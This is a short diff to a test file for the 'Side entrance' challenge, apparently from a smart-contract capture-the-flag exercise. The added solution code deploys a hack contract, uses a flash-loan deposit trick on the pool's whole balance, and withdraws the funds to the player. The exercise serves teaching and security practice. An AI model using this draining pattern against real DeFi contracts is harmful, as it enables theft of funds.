@@ -26,6 +26,14 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const SideEntranceHackFactory = await ethers.getContractFactory('SideEntranceHack', player);
+        let hackContract = await SideEntranceHackFactory.deploy(pool.address);
+        // Call its attack functin we set up to deposit flash loan
+        await hackContract.attackTarget(ethers.provider.getBalance(pool.address));
+
+        // Withdraw and send funds to player.address
+        await hackContract.withdraw();
+
     });
 
     after(async function () {
